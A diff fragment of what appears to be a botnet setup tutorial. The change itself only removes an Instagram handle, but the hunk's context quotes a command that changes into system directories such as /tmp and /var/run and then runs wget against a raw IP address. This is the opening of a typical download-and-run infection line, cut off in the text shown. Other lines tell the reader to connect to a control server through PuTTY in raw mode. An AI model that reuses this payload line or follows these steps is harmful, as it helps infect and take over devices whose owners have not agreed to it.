@@ -39,8 +39,6 @@ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.38.245.22
 Now goto putty and login with the Your ip and port and make sure its set up on raw instead ssh.
 
 9th Step: YOUR WELCOME YA NOOB :)
-Follow Me ON IG @873u
-
 
 
 
